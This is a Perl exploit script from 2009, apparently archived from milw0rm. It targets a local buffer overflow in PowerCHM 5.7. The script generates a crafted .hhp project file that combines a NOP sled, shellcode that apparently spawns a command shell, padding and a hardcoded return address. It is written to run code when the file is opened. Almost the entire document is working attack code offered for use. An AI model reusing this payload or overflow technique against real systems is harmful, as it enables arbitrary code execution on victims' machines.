<html><head><title>PowerCHM 5.7 (hhp) Local Buffer Overflow Exploit</title></head><pre>#!/usr/bin/perl
#
# Title: PowerCHM 5.7 (hhp) Local Buffer Overflow Exploit
#
# Summary: With PowerCHM you can create your CHM files
# automatically from Html Files (including .htm, .html
# and .mht), Text Files (.txt), Microsoft Word Documents
# (.doc) and Adobe Acrobat Document (.pdf).
#
# Product web page: http://www.dawningsoft.com/products/powerchm.htm
#
# Tested on WinXP Pro SP2 (English)
#
# Refs:	http://www.milw0rm.com/exploits/8300
#	http://security.biks.vn/?p=365
#
# Exploit by Gjoko 'LiquidWorm' Krstic
#
# liquidworm gmail com
#
# http://www.zeroscience.org/
#
# 28.03.2009
#

my $header=&quot;
	[OPTIONS]\n
	Compatibility=1.1 or later\n
	Compiled file=zero.chm\n
	Contents file=science.hhc\n
	Index file=lqwrm.hhk\n
	Binary Index=Yes\n
	Language=0x042F\n
	Title=\n
	Error log file=Errlog.txt\n
	Default Window=main\n\n
	[WINDOWS]\n
	main='',science.hhc,lqwrm.hhk,'','',,,,,0x41520,240,0x184E,[262,184,762,584],,,,0,0,0,0\n\n
	[FILES]\n\n
	[INFOTYPES]\n
	&quot;;


my $sc =&quot;\x8B\xEC\x33\xFF\x57\xC6\x45\xFC\x63\xC6\x45&quot;.
	&quot;\xFD\x6D\xC6\x45\xFE\x64\xC6\x45\xF8\x01\x8D&quot;.
	&quot;\x45\xFC\x50\xB8\xC7\x93\xBF\x77\xFF\xD0&quot;;


my $bof = &quot;\x90&quot; x 568 . &quot;$sc&quot; . &quot;\x41&quot; x 400 . &quot;\xe8\xed\x12\x00&quot; . &quot;\x42&quot; x 500;

my $file = &quot;Watchmen.hhp&quot;;
open (hhp, &quot;&gt;./$file&quot;) || die &quot;\nCan't open $file: $!&quot;;
print hhp &quot;$header&quot; . &quot;$bof&quot;;
close (hhp);
sleep 1;
print &quot;\nFile $file successfully created!\n&quot;;

# milw0rm.com [2009-03-29]</pre></html>